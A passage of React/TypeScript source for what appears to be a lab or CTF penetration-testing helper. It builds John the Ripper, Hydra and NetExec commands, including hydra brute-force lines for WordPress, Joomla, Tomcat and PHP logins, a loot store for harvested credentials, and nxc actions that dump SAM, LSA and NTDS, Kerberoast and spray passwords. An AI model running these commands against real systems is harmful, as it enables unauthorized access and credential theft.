    if (attack === "show") crack.push("--show", target);
    else if (attack === "single") {
      if (johnRules) crack.push(`--rules=${johnRules}`);
      crack.push("--single", target);
    } else if (attack === "incremental") crack.push(`--incremental=${incremental}`, target);
    else {
      crack.push(`--wordlist=${wordlist}`);
      if (johnRules) crack.push(`--rules=${johnRules}`);
      const mask = johnMask.trim();
      if (/^[?ludsabA-Za-z0-9]{1,32}$/.test(mask)) crack.push(`--mask=${mask}`);
      crack.push(target);
    }
    johnSteps.push({ kind: "exec", bin: "john", args: crack });
    if (attack !== "show") johnSteps.push({ kind: "exec", bin: "john", args: [...(format ? [`--format=${format}`] : []), "--show", target] });
    const extraText = extraArgs.map(quoteHydraArg).join(" ");
    const crackLine = ["john", ...crack.map(quoteHydraArg), ...(extraText ? [extraText] : [])].join(" ");
    const showLine = attack === "show" ? "" : `\njohn${format ? ` --format=${format}` : ""} --show ${target}`;
    command = [convert, crackLine].filter(Boolean).join("\n") + showLine;
    for (const step of johnSteps) {
      if (step.kind === "exec-to-file") johnQuick.push(step);
    }
    const quick: string[] = [];
    if (format) quick.push(`--format=${format}`);
    if (attack === "show") quick.push("--show", target);
    else if (attack === "single") quick.push("--single", target);
    else quick.push(`--wordlist=${wordlist || "/usr/share/wordlists/rockyou.txt"}`, target);
    johnQuick.push({ kind: "exec", bin: "john", args: quick });
    if (attack !== "show") {
      johnQuick.push({ kind: "exec", bin: "john", args: [...(format ? [`--format=${format}`] : []), "--show", target] });
    }
  }

  return (
    <Shell
      title="john"
      blurb="John wants its own hash file. Convert first, then the wordlist, then --show."
      command={command}
      empty="The file name has a character John would treat as a second argument. Use a plain path."
      why={
        job.convert({ key: "FILE", passwd: "passwd", shadow: "shadow", file: "FILE", hash: "hashes.txt" }).split(" ")[0] +
        (job.id === "hash"
          ? " reads the hash file as it is."
          : " rewrites the file into a hash John understands. The > sends that hash to a new file and overwrites it if you run the line again.") +
        (format ? ` --format=${format} forces the mode when John guesses wrong.` : " With no --format, John detects the hash.") +
        (attack === "single"
          ? " --single tries the username and GECOS fields, which is worth one run on a Linux shadow."
          : attack === "show"
            ? " --show prints passwords already cracked. It does not start a new run."
            : attack === "incremental"
              ? " --incremental builds guesses from a character set. ASCII is the wide one. Digits and LowerNum are the short ones."
              : " --wordlist is one guess per line." + (johnRules ? ` --rules=${johnRules} mutates each word with that rule set.` : "")) +
        (fork === "2" || fork === "4" ? ` --fork=${fork} runs that many processes.` : "") +
        (digits(maxLen, 32) ? ` --max-length=${digits(maxLen, 32)} drops longer guesses.` : "") +
        " john --show prints user:password when something hit."
      }
      note={job.note}
      then="Use the password. A key passphrase is for ssh -i until you also try it as a login."
      footer={
        <ToolRun
          endpoint="/api/run"
          tool="john"
          disabled={!ready}
          placeholder="--fork=2"
          onFlags={setExtraArgs}
          buildBody={(extra) => ({
            steps: johnSteps.map((step, index) =>
              step.kind === "exec" && index === johnSteps.findIndex((item) => item.kind === "exec")
                ? { ...step, args: [...step.args, ...extra] }
                : step,
            ),
          })}
          buildQuick={() => ({ steps: johnQuick })}
          quickHint="Quick run converts the file, then uses --wordlist or --single and --show. Rules, fork, and mask stay off. A chosen format is kept."
        />
      }
    >
      <Field label="What you have">
        <select
          className={control}
          value={jobId}
          onChange={(e) => {
            const next = JOHN_JOBS.find((j) => j.id === e.target.value) ?? JOHN_JOBS[0];
            setJobId(next.id);
            const initial: Record<string, string> = {};
            for (const field of next.fields) initial[field.key] = field.initial;
            setFiles(initial);
          }}
        >
          {JOHN_JOBS.map((j) => (
            <option key={j.id} value={j.id}>
              {j.label}
            </option>
          ))}
        </select>
      </Field>
      <Field label="Attack">
        <select className={control} value={attack} onChange={(e) => setAttack(e.target.value as typeof attack)}>
          <option value="wordlist">Wordlist</option>
          <option value="single">Single (username and GECOS)</option>
          <option value="incremental">Incremental</option>
          <option value="show">Show what is already cracked</option>
        </select>
      </Field>
      {job.fields.map((field) => (
        <Field key={field.key} label={field.label}>
          <input
            className={control}
            value={files[field.key] ?? ""}
            onChange={(e) => setFiles((prev) => ({ ...prev, [field.key]: e.target.value }))}
          />
        </Field>
      ))}
      {job.id === "ssh" ? (
        <LootPick
          kinds={["sshkey"]}
          onPick={() => {
            setJobId("ssh");
            setFiles((prev) => ({ ...prev, key: "id_rsa" }));
          }}
        />
      ) : null}
      {attack === "wordlist" ? (
        <Field label="Wordlist">
          <select className={control} value={list} onChange={(e) => setList(e.target.value)}>
            <option value="/usr/share/wordlists/rockyou.txt">rockyou</option>
            <option value="found.txt">found.txt</option>
            <option value="custom">Other path</option>
          </select>
        </Field>
      ) : null}
      {attack === "wordlist" && list === "custom" ? (
        <Field label="Wordlist path">
          <input className={control} value={customList} onChange={(e) => setCustomList(e.target.value)} />
        </Field>
      ) : null}
      {attack === "incremental" ? (
        <Field label="Incremental mode">
          <select className={control} value={incremental} onChange={(e) => setIncremental(e.target.value)}>
            <option value="ASCII">ASCII</option>
            <option value="LM_ASCII">LM_ASCII</option>
            <option value="Alnum">Alnum</option>
            <option value="LowerNum">LowerNum</option>
            <option value="Digits">Digits</option>
          </select>
        </Field>
      ) : null}
      <Field label="Force a format">
        <select className={control} value={format} onChange={(e) => setFormat(e.target.value)}>
          {JOHN_FORMATS.map((f) => (
            <option key={f.id || "auto"} value={f.id}>
              {f.label}
            </option>
          ))}
        </select>
      </Field>
      {attack === "wordlist" || attack === "single" ? (
        <Field label="Rules --rules">
          <select className={control} value={johnRules} onChange={(e) => setJohnRules(e.target.value)}>
            <option value="">No rules</option>
            <option value="Wordlist">Wordlist</option>
            <option value="Single">Single</option>
            <option value="Extra">Extra</option>
            <option value="Jumbo">Jumbo</option>
            <option value="KoreLogic">KoreLogic</option>
            <option value="All">All</option>
          </select>
        </Field>
      ) : null}
      {attack === "wordlist" ? (
        <Field label="Mask --mask">
          <input className={control} value={johnMask} onChange={(e) => setJohnMask(e.target.value)} placeholder="?u?l?l?l?d?d" />
        </Field>
      ) : null}
      <Field label="Processes --fork">
        <select className={control} value={fork} onChange={(e) => setFork(e.target.value)}>
          <option value="1">1</option>
          <option value="2">2</option>
          <option value="4">4</option>
        </select>
      </Field>
      <Field label="Max length">
        <input className={control} value={maxLen} onChange={(e) => setMaxLen(e.target.value)} placeholder="8" inputMode="numeric" />
      </Field>
      <Field label="Only these users">
        <input className={control} value={johnUsers} onChange={(e) => setJohnUsers(e.target.value)} placeholder="root,admin" />
      </Field>
      <Field label="Pot file --pot">
        <input className={control} value={pot} onChange={(e) => setPot(e.target.value)} placeholder="john.pot" />
      </Field>
      <Field label="Session">
        <input className={control} value={johnSession} onChange={(e) => setJohnSession(e.target.value)} placeholder="box1" />
      </Field>
    </Shell>
  );
}

const WEB_GUIDES: {
  id: string;
  label: string;
  service?: string;
  path?: string;
  basic?: string;
  userField?: string;
  passField?: string;
  extra?: string;
  marker?: string;
  markerMode?: "fail" | "ok";
  user?: string;
  need: string;
  terminal: string;
}[] = [
  {
    id: "method",
    label: "How to take a login apart",
    need: `You need four things from one failed login, not from memory.
1. Open the login page. F12, Network, tick Preserve log.
2. Submit one wrong password. Click the POST that appears.
3. Request URL gives the path. /login.php stays. The host does not.
4. Form Data gives the field names. The password value becomes ^PASS^. The username value becomes ^USER^.
5. The response body has a word that appears only on failure, such as Invalid. That word is the third field.
6. A colon inside that word breaks the hydra argument. Pick a different word.
7. If the only useful word appears on success, prefix it with S=.
8. The list is found.txt, a handful of passwords you already recovered. -t 1 -f -I.
9. When hydra prints the pair, log in once in the browser. Hydra is finished.
The Run button on this page uses the same command. The terminal block is the same command typed by hand.`,
    terminal: `hydra -t 1 -f -I -l admin -P found.txt <ip> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"`,
  },
  {
    id: "php",
    label: "Example: PHP form, failure text",
    service: "http-post",
    path: "/login.php",
    userField: "username",
    passField: "password",
    extra: "",
    marker: "Invalid",
    markerMode: "fail",
    user: "admin",
    need: "The POST body was username=admin&password=wrong and the HTML came back with the word Invalid. ^USER^ and ^PASS^ replace those two values. Anything else in the body, such as a submit button, goes in Extra body fields. Choosing this fills the form below.",
    terminal: `hydra -t 1 -f -I -l admin -P found.txt 10.10.10.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"`,
  },
  {
    id: "wordpress",
    label: "Example: WordPress",
    service: "http-post",
    path: "/wp-login.php",
    userField: "log",
    passField: "pwd",
    extra: "wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
    marker: "Incorrect",
    markerMode: "fail",
    user: "admin",
    need: "WordPress does not call the fields username and password. They are log and pwd. The failure page says Incorrect. The extra fields are the button and the redirect. Copy them from your own POST if this site added more.",
    terminal: `hydra -t 1 -f -I -l admin -P found.txt 10.10.10.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:Incorrect"`,
  },
  {
    id: "joomla",
    label: "Example: Joomla",
    service: "http-post",
    path: "/administrator/index.php",
    userField: "username",
    passField: "passwd",
    extra: "option=com_login&task=login",
    marker: "not match",
    markerMode: "fail",
    user: "admin",
    need: "The password field is passwd, not password. option and task have to be in the body or Joomla ignores the attempt. The failure text is often 'not match'. Use a short word with no colon.",
    terminal: `hydra -t 1 -f -I -l admin -P found.txt 10.10.10.5 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:not match"`,
  },
  {
    id: "https",
    label: "Example: the same form on HTTPS",
    service: "https-post",
    path: "/login.php",
    userField: "username",
    passField: "password",
    extra: "",
    marker: "Invalid",
    markerMode: "fail",
    user: "admin",
    need: "Nothing in the body changes. The module name is what turns on TLS: https-post-form instead of http-post-form. Do not also tick -S. That wraps TLS a second time.",
    terminal: `hydra -t 1 -f -I -l admin -P found.txt 10.10.10.5 https-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"`,
  },
  {
    id: "basic",
    label: "Example: browser popup, basic auth",
    service: "http-get",
    basic: "/admin",
    user: "admin",
    need: "There is no form and no failure word. The browser showed a popup before any HTML. That is http-get, and the path is the URL that caused the popup. Hydra treats a 401 as a failure and anything else as a hit. An HTTPS popup is https-get on 443.",
    terminal: `hydra -t 1 -f -I -l admin -P found.txt 10.10.10.5 http-get /admin`,
  },
  {
    id: "tomcat",
    label: "Example: Tomcat manager",
    service: "http-get",
    basic: "/manager/html",
    user: "tomcat",
    need: "Manager is basic auth, not a form. The path is /manager/html. The usual names are tomcat, admin, and manager, and only passwords you already found. A hit means you can deploy. Log in in the browser and stop.",
    terminal: `hydra -t 1 -f -I -l tomcat -P found.txt 10.10.10.5 http-get /manager/html`,
  },
  {
    id: "success",
    label: "Example: you only have a success word",
    service: "http-post",
    path: "/login",
    userField: "user",
    passField: "pass",
    extra: "",
    marker: "Welcome",
    markerMode: "ok",
    user: "admin",
    need: "Some apps return the same page on failure and only say Welcome after a good login. S= tells hydra the word means success. Without S=, hydra treats a missing word as success and every attempt looks valid.",
    terminal: `hydra -t 1 -f -I -l admin -P found.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"`,
  },
  {
    id: "aspx",
    label: "Stop: ASP.NET viewstate",
    need: "If the POST body contains __VIEWSTATE or __EVENTVALIDATION, do not hydra it. Those values expire and belong to one page load. Hydra will report the wrong result. Look for SQL, a file, or a password you already have.",
    terminal: `# do not run hydra against this body
# __VIEWSTATE=...&__EVENTVALIDATION=...&username=admin&password=wrong`,
  },
];

const HYDRA_SERVICES: {
  id: string;
  label: string;
  module: string;
  port: string;
  form: boolean;
  path: boolean;
  user: boolean;
  note: string;
  stop?: boolean;
}[] = [
  { id: "ssh", label: "SSH", module: "ssh", port: "22", form: false, path: false, user: true, note: "One host, a tiny list. A screen of failures ends it." },
  { id: "ftp", label: "FTP", module: "ftp", port: "21", form: false, path: false, user: true, note: "Anonymous failed, and you already have two or three passwords." },
  {
    id: "telnet",
    label: "Telnet",
    module: "telnet",
    port: "23",
    form: false,
    path: false,
    user: true,
    note: "Only if a banner already showed a real login. Do not open with this.",
  },
  { id: "http-get", label: "HTTP basic auth", module: "http-get", port: "80", form: false, path: true, user: true, note: "The path is the URL that popped the browser login box." },
  { id: "https-get", label: "HTTPS basic auth", module: "https-get", port: "443", form: false, path: true, user: true, note: "Same as HTTP basic, on TLS." },
  { id: "http-post", label: "HTTP login form", module: "http-post-form", port: "80", form: true, path: false, user: true, note: "Build the body from one failed login in the Network tab." },
  { id: "https-post", label: "HTTPS login form", module: "https-post-form", port: "443", form: true, path: false, user: true, note: "Same form syntax. The module name is what makes it TLS." },
  { id: "mysql", label: "MySQL", module: "mysql", port: "3306", form: false, path: false, user: true, note: "root and the passwords you already found. Not rockyou." },
  { id: "mssql", label: "MSSQL", module: "mssql", port: "1433", form: false, path: false, user: true, note: "sa is the usual local name. A domain account belongs in nxc, not here." },
  { id: "postgres", label: "PostgreSQL", module: "postgres", port: "5432", form: false, path: false, user: true, note: "postgres is the usual name." },
  { id: "vnc", label: "VNC", module: "vnc", port: "5900", form: false, path: false, user: false, note: "VNC has a password and no username." },
  {
    id: "rdp",
    label: "RDP",
    module: "rdp",
    port: "3389",
    form: false,
    path: false,
    user: true,
    note: "A local account on one host. Do not hydra RDP at a domain controller.",
    stop: true,
  },
  {
    id: "smb",
    label: "SMB",
    module: "smb",
    port: "445",
    form: false,
    path: false,
    user: true,
    note: "Do not hydra SMB at a domain. Use the nxc builder and one password you already know.",
    stop: true,
  },
];

function HydraBuilder() {
  const [serviceId, setServiceId] = useState("ssh");
  const [target, setTarget] = useState("");
  const [port, setPort] = useState("");
  const [userMode, setUserMode] = useState<"one" | "file" | "loot">("one");
  const [user, setUser] = useState("admin");
  const [passMode, setPassMode] = useState<"file" | "one" | "loot">("file");
  const [passFile, setPassFile] = useState("found.txt");
  const [password, setPassword] = useState("");
  useSyncExternalStore(subscribeLoot, getLoot, getLootServer);
  const savedUsers = lootLines("user");
  const savedPasses = lootLines("pass");
  const [path, setPath] = useState("/login.php");
  const [basicPath, setBasicPath] = useState("/");
  const [userField, setUserField] = useState("username");
  const [passField, setPassField] = useState("password");
  const [extra, setExtra] = useState("");
  const [markerMode, setMarkerMode] = useState<"fail" | "ok">("fail");
  const [marker, setMarker] = useState("Invalid");
  const [extraArgs, setExtraArgs] = useState<string[]>([]);
  const [tasks, setTasks] = useState("1");
  const [stopFound, setStopFound] = useState<"f" | "F" | "">("f");
  const [verbose, setVerbose] = useState<"" | "v" | "V">("");
  const [ignoreRestore, setIgnoreRestore] = useState(true);
  const [ssl, setSsl] = useState(false);
  const [tryExtra, setTryExtra] = useState("");
  const [waitTime, setWaitTime] = useState("");
  const [hydraOut, setHydraOut] = useState("");
  const [hydraFmt, setHydraFmt] = useState("text");
  const [modOpt, setModOpt] = useState("");
  const [webGuide, setWebGuide] = useState("method");

  const svc = HYDRA_SERVICES.find((s) => s.id === serviceId) ?? HYDRA_SERVICES[0];
  const host = cleanTarget(target);
  const portOk = port.trim() === "" || (Number(port) >= 1 && Number(port) <= 65535 && /^\d+$/.test(port.trim()));
  const userValue = userMode === "loot" ? (savedUsers.length ? "loot-users.txt" : "") : userMode === "file" ? cleanPath(user) : cleanUser(user);
  const passPath = passMode === "loot" ? (savedPasses.length ? "loot-passwords.txt" : "") : cleanPath(passFile);
  const passOne = cleanLoose(password);
  const rockyou = /rockyou/i.test(passFile) || /rockyou/i.test(password);
  const formPath = path.trim();
  const pathOk = !svc.form || /^\/[A-Za-z0-9_./?+=&%-]*$/.test(formPath);
  const basicOk = !svc.path || /^\/[A-Za-z0-9_./?+=&%-]*$/.test(basicPath.trim());
  const fieldOk = /^[A-Za-z0-9_-]*$/.test(userField) && /^[A-Za-z0-9_-]+$/.test(passField);
  const extraOk = extra.trim() === "" || /^[A-Za-z0-9._~=&%+-]+$/.test(extra.trim());
  const viewstate = /viewstate|eventvalidation/i.test(extra) || /viewstate|eventvalidation/i.test(path);
  const markerClean = marker.replace(/[:\n\r"']/g, "").trim();
  const ready =
    Boolean(host) &&
    portOk &&
    !rockyou &&
    !viewstate &&
    pathOk &&
    basicOk &&
    (!svc.form || (fieldOk && extraOk && markerClean.length > 0)) &&
    (!svc.user || Boolean(userValue)) &&
    (passMode === "one" ? passOne.length > 0 : Boolean(passPath));

  let command = "";
  const args: string[] = [];
  let quickArgs: string[] = [];
  if (ready) {
    const tail: string[] = [];
    if (svc.user && (userMode === "file" || userMode === "loot") && passMode !== "one") tail.push("-u");
    if (svc.user) tail.push(userMode === "one" ? "-l" : "-L", userValue);
    if (passMode === "one") tail.push("-p", passOne);
    else tail.push("-P", passMode === "loot" ? "loot-passwords.txt" : passPath);
    if (port.trim() && port.trim() !== svc.port) tail.push("-s", port.trim());
    tail.push(host, svc.module);
    if (svc.path) tail.push(basicPath.trim());
    if (svc.form) {
      const body = [userField ? `${userField}=^USER^` : "", `${passField}=^PASS^`, extra.trim()]
        .filter(Boolean)
        .join("&");
      const flag = markerMode === "ok" ? "S=" : "";
      tail.push(`${formPath}:${body}:${flag}${markerClean}`);
    }
    args.push("-t", tasks === "4" || tasks === "16" ? tasks : "1");
    if (stopFound === "F") args.push("-F");
    else if (stopFound === "f") args.push("-f");
    if (verbose === "v" || verbose === "V") args.push(`-${verbose}`);
    if (ignoreRestore) args.push("-I");
    if (ssl && !svc.module.startsWith("https")) args.push("-S");
    if (/^[nsr]{1,3}$/.test(tryExtra)) args.push("-e", tryExtra);
    const wait = digits(waitTime, 60);
    if (wait) args.push("-w", wait);
    const out = cleanPath(hydraOut);
    if (out) {
      args.push("-o", out);
      if (hydraFmt === "json" || hydraFmt === "jsonv1") args.push("-b", hydraFmt);
    }
    if (/^[A-Za-z0-9=,:._@/+-]{1,120}$/.test(modOpt.trim())) args.push("-m", modOpt.trim());
    args.push(...tail, ...extraArgs);
    quickArgs = ["-t", "1", "-f", "-I", "-V", ...tail];
    command = ["hydra", ...args.map(quoteHydraArg)].join(" ");
  }

  const blocked = rockyou
    ? "That list is too big for Hydra here. Use found.txt, the two or three passwords you already recovered."
    : viewstate
      ? "That body has a viewstate. It expires. Hydra will lie. Stop and try another bug."
      : svc.note;

  return (
    <Shell
      title="hydra"
      blurb="A tiny list only. -t 1 is one try at a time. -f stops at the first hit. A form is built from one failed login, not from memory."
      command={command}
      empty={rockyou || viewstate ? blocked : "Fill in the host. The command appears when the form text is safe to paste."}
      why={
        svc.form
          ? "-t 1 is one login at a time. -f stops at the first password that works. -l is one user, -L is a file, -P is the password file. http-post-form takes the path, then the body, then the text that decides success. ^USER^ and ^PASS^ are replaced by hydra. A colon inside the failure text would split the argument, so it is left out. S= means the text appears on success. Without S=, hydra treats a missing string as success."
          : "-t is how many logins run at once. 1 avoids a lockout. -f stops at the first valid pair. -F keeps going until every listed user has a password. -V prints each attempt. -I ignores a restore file from a crashed run. -e n is a blank password, s is the username, r is the username reversed. -S wraps the service in TLS. -w is the wait for a reply. -o writes hits. -m is a module option. -l is one name, -L a file, -p one password, -P a file. -u, when both sides are files, tries every user with one password before the next."
      }
      note={((userMode === "file" || userMode === "loot") && passMode !== "one" ? "Both lists are files, so -u is on. " : "") + blocked}
      stop={Boolean(svc.stop) || rockyou || viewstate}
      then="Log in once with the pair, by hand. Then try that password on SSH, SMB, or WinRM. Hydra is finished."
      footer={
        <HydraRun
          args={args}
          quickArgs={quickArgs}
          disabled={!ready || Boolean(svc.stop)}
          onFlags={(_text, extraFlags) => setExtraArgs(extraFlags)}
          lists={{
            ...(userMode === "loot" ? { users: savedUsers.join("\n") } : {}),
            ...(passMode === "loot" ? { passwords: savedPasses.join("\n") } : {}),
          }}
        />
      }
    >
      <Field label="Web login">
        <select
          className={control}
          value={webGuide}
          onChange={(e) => {
            const id = e.target.value;
            setWebGuide(id);
            const guide = WEB_GUIDES.find((item) => item.id === id);
            if (!guide?.service) return;
            setServiceId(guide.service);
            if (guide.path) setPath(guide.path);
            if (guide.basic) setBasicPath(guide.basic);
            if (guide.userField !== undefined) setUserField(guide.userField);
            if (guide.passField) setPassField(guide.passField);
            if (guide.extra !== undefined) setExtra(guide.extra);
            if (guide.marker) setMarker(guide.marker);
            if (guide.markerMode) setMarkerMode(guide.markerMode);
            if (guide.user) {
              setUserMode("one");
              setUser(guide.user);
            }
          }}
        >
          {WEB_GUIDES.map((guide) => (
            <option key={guide.id} value={guide.id}>
              {guide.label}
            </option>
          ))}
        </select>
      </Field>
      <div className="sm:col-span-2 rounded-lg border border-border bg-bg p-3">
        <p className="whitespace-pre-wrap text-sm text-fg">{WEB_GUIDES.find((guide) => guide.id === webGuide)?.need}</p>
        <p className="mt-3 font-mono text-xs text-muted">TERMINAL</p>
        <pre className="mt-1 whitespace-pre-wrap break-words font-mono text-xs text-fg">
          {WEB_GUIDES.find((guide) => guide.id === webGuide)?.terminal}
        </pre>
      </div>
      <Field label="Service">
        <select className={control} value={serviceId} onChange={(e) => setServiceId(e.target.value)}>
          {HYDRA_SERVICES.map((s) => (
            <option key={s.id} value={s.id}>
              {s.label}
            </option>
          ))}
        </select>
      </Field>
      <Field label="Host">
        <input className={control} value={target} onChange={(e) => setTarget(e.target.value)} placeholder="10.10.10.5" />
      </Field>
      <Field label={"Port (default " + svc.port + ")"}>
        <input className={control} value={port} onChange={(e) => setPort(e.target.value)} placeholder={svc.port} inputMode="numeric" />
      </Field>
      {svc.user ? (
        <Field label="Username">
          <select className={control} value={userMode} onChange={(e) => setUserMode(e.target.value as typeof userMode)}>
            <option value="one">One username</option>
            <option value="file">Username file</option>
            <option value="loot">All saved users ({savedUsers.length})</option>
          </select>
        </Field>
      ) : null}
      {svc.user && userMode !== "loot" ? (
        <Field label={userMode === "file" ? "Username file" : "Username"}>
          <input className={control} value={user} onChange={(e) => setUser(e.target.value)} />
        </Field>
      ) : null}
      {svc.user && userMode === "loot" ? (
        <p className="text-sm text-muted sm:col-span-2">{savedUsers.length ? `${savedUsers.length} saved users are written to loot-users.txt when you run.` : "No users are saved in loot yet."}</p>
      ) : null}
      <Field label="Password">
        <select className={control} value={passMode} onChange={(e) => setPassMode(e.target.value as typeof passMode)}>
          <option value="file">Password file</option>
          <option value="one">One password</option>
          <option value="loot">All saved passwords ({savedPasses.length})</option>
        </select>
      </Field>
      {passMode === "file" ? (
        <Field label="Password file">
          <input className={control} value={passFile} onChange={(e) => setPassFile(e.target.value)} />
        </Field>
      ) : passMode === "loot" ? (
        <p className="text-sm text-muted sm:col-span-2">{savedPasses.length ? `${savedPasses.length} saved passwords are written to loot-passwords.txt when you run. A key password is included. A hash is not.` : "No passwords are saved in loot yet."}</p>
      ) : (
        <Field label="Password">
          <input className={control} value={password} onChange={(e) => setPassword(e.target.value)} />
        </Field>
      )}
      <LootPick
        kinds={["user", "pass"]}
        onPick={(item) => {
          if (item.user) {
            setUserMode("one");
            setUser(item.user);
          }
          if (item.kind === "pass") {
            setPassMode("one");
            setPassword(item.secret);
          }
        }}
      />
      {svc.path ? (
        <Field label="Path">
          <input className={control} value={basicPath} onChange={(e) => setBasicPath(e.target.value)} />
        </Field>
      ) : null}
      {svc.form ? (
        <>
          <Field label="Form path">
            <input className={control} value={path} onChange={(e) => setPath(e.target.value)} />
          </Field>
          <Field label="Username field">
            <input className={control} value={userField} onChange={(e) => setUserField(e.target.value)} placeholder="blank if the form has no username" />
          </Field>
          <Field label="Password field">
            <input className={control} value={passField} onChange={(e) => setPassField(e.target.value)} />
          </Field>
          <Field label="Extra body fields">
            <input className={control} value={extra} onChange={(e) => setExtra(e.target.value)} placeholder="login=Log+In" />
          </Field>
          <Field label="How to judge the reply">
            <select className={control} value={markerMode} onChange={(e) => setMarkerMode(e.target.value as typeof markerMode)}>
              <option value="fail">Text that appears only on failure</option>
              <option value="ok">Text that appears only on success (S=)</option>
            </select>
          </Field>
          <Field label="That text">
            <input className={control} value={marker} onChange={(e) => setMarker(e.target.value)} />
          </Field>
        </>
      ) : null}
      <Field label="Tasks -t">
        <select className={control} value={tasks} onChange={(e) => setTasks(e.target.value)}>
          <option value="1">1. One login at a time</option>
          <option value="4">4</option>
          <option value="16">16. Hydra's own default</option>
        </select>
      </Field>
      <Field label="Stop">
        <select className={control} value={stopFound} onChange={(e) => setStopFound(e.target.value as typeof stopFound)}>
          <option value="f">-f. Stop at the first valid pair</option>
          <option value="F">-F. A password for every user, then stop</option>
          <option value="">Keep going through the list</option>
        </select>
      </Field>
      <Field label="Verbose">
        <select className={control} value={verbose} onChange={(e) => setVerbose(e.target.value as typeof verbose)}>
          <option value="">Normal</option>
          <option value="v">-v</option>
          <option value="V">-V. Show each login</option>
        </select>
      </Field>
      <Field label="Also try -e">
        <select className={control} value={tryExtra} onChange={(e) => setTryExtra(e.target.value)}>
          <option value="">Nothing extra</option>
          <option value="n">n. Blank password</option>
          <option value="s">s. Username as the password</option>
          <option value="r">r. Username reversed</option>
          <option value="ns">n and s</option>
          <option value="nsr">n, s, and r</option>
        </select>
      </Field>
      <Field label="Restore file -I">
        <select className={control} value={ignoreRestore ? "yes" : "no"} onChange={(e) => setIgnoreRestore(e.target.value === "yes")}>
          <option value="yes">Ignore it. A crashed run will not block this one</option>
          <option value="no">Resume if hydra.restore exists</option>
        </select>
      </Field>
      {svc.module.startsWith("https") ? null : (
        <Field label="TLS -S">
          <select className={control} value={ssl ? "yes" : "no"} onChange={(e) => setSsl(e.target.value === "yes")}>
            <option value="no">Plain</option>
            <option value="yes">Wrap this service in TLS</option>
          </select>
        </Field>
      )}
      <Field label="Wait -w seconds">
        <input className={control} value={waitTime} onChange={(e) => setWaitTime(e.target.value)} placeholder="32" inputMode="numeric" />
      </Field>
      <Field label="Hits file -o">
        <input className={control} value={hydraOut} onChange={(e) => setHydraOut(e.target.value)} placeholder="hydra.txt" />
      </Field>
      <Field label="Hits format -b">
        <select className={control} value={hydraFmt} onChange={(e) => setHydraFmt(e.target.value)}>
          <option value="text">text</option>
          <option value="json">json</option>
          <option value="jsonv1">jsonv1</option>
        </select>
      </Field>
      <Field label="Module option -m">
        <input className={control} value={modOpt} onChange={(e) => setModOpt(e.target.value)} placeholder="LOGIN" />
      </Field>
    </Shell>
  );
}

type NxcAction = {
  id: string;
  label: string;
  protocols: string[];
  note: string;
  stop?: boolean;
  outfile?: string;
};

const NXC_ACTIONS: NxcAction[] = [
  { id: "auth", label: "Check the login", protocols: ["smb", "ldap", "winrm", "mssql", "rdp", "ssh", "ftp", "wmi"], note: "[+] is a valid login. (Pwn3d!) means local admin on that host. A check is not a shell." },
  { id: "shares", label: "List shares", protocols: ["smb"], note: "READ is worth opening. Ignore IPC$ once you have looked." },
  { id: "users", label: "List users", protocols: ["smb", "ldap"], note: "You need a valid login for a full list. Empty creds only work when the host allows anonymous." },
  { id: "groups", label: "List groups", protocols: ["smb", "ldap"], note: "You are looking for who is in Administrators, Domain Admins, and any odd group." },
  { id: "active", label: "Active users", protocols: ["ldap"], note: "Skips disabled accounts so the spray list stays short." },
  { id: "passpol", label: "Password policy", protocols: ["smb"], note: "Read the lockout threshold before you spray. One password, then wait." },
  { id: "rid", label: "RID brute", protocols: ["smb"], note: "Useful when you have no creds and the host still answers RID 500 and 501." },
  { id: "spider", label: "Spider a share", protocols: ["smb"], note: "One share, one pattern. A hit is a file to download, not a reason to spider the next host yet." },
  { id: "gpp", label: "GPP passwords", protocols: ["smb"], note: "Looks in SYSVOL for a cpassword and decrypts the known key. Nothing means the old bug is not here." },
  { id: "laps-ldap", label: "LAPS (LDAP)", protocols: ["ldap"], note: "Prints a password only if your user is allowed to read it." },
  { id: "laps-smb", label: "LAPS (SMB)", protocols: ["smb"], note: "Same check from the SMB modules. Point it at the computers, not only the DC." },
  { id: "adcs", label: "ADCS check", protocols: ["ldap"], note: "You only chase a template if this says a template is vulnerable. ESC1 is the one that matters first." },
  { id: "deleg", label: "Delegation", protocols: ["ldap"], note: "Unconstrained is the one that becomes a ticket. Constrained still needs a path you can use." },
  { id: "kerb", label: "Kerberoast", protocols: ["ldap"], outfile: "kerb.txt", note: "Writes TGS hashes. Crack mode 13100. A long random service password will not fall." },
  { id: "asrep", label: "AS-REP roast", protocols: ["ldap"], outfile: "asrep.txt", note: "Writes AS-REP hashes. Crack mode 18200. No entries means nobody has pre-auth disabled." },
  { id: "blood", label: "BloodHound collect", protocols: ["ldap"], note: "Collect once, then look at the path in BloodHound. Do not collect again because the first view was confusing." },
  { id: "sam", label: "Dump SAM", protocols: ["smb"], note: "Needs local admin, the (Pwn3d!) line. These hashes are local. Pass them with --local-auth." },
  { id: "lsa", label: "Dump LSA", protocols: ["smb"], note: "Needs local admin. You are looking for a plaintext password or an extra hash." },
  { id: "ntds", label: "Dump NTDS", protocols: ["smb"], stop: true, note: "Only once you are already admin on the domain controller. This dumps the domain. It is not how you get in." },
  { id: "loggedon", label: "Logged on users", protocols: ["smb"], note: "A domain admin session on a workstation is a reason to go there, if you can." },
  { id: "spray", label: "Spray one password", protocols: ["smb"], stop: true, note: "One password you already found, against users you already listed. Not rockyou. Stop on a wall of failures." },
  { id: "cmd", label: "Run one command", protocols: ["smb", "winrm"], note: "Only after (Pwn3d!) or a WinRM [+]. whoami is the check. Then move to a real shell." },
  { id: "query", label: "Run a SQL query", protocols: ["mssql"], note: "Only after the login is [+]. A query is not xp_cmdshell until the mssql card says you are there." },
  { id: "zero", label: "Zerologon check", protocols: ["smb"], stop: true, note: "Last look, after roast, ACL, LAPS, shares, and local privesc are dead. This line only checks. Exploiting it can break the DC." },
];

function NxcBuilder() {
  const [proto, setProto] = useState("smb");
  const [action, setAction] = useState("auth");
  const [target, setTarget] = useState("");
  const [auth, setAuth] = useState<"pass" | "hash" | "anon" | "cache" | "key">("pass");
  const [user, setUser] = useState("");
  const [secret, setSecret] = useState("");
  const [domain, setDomain] = useState("");
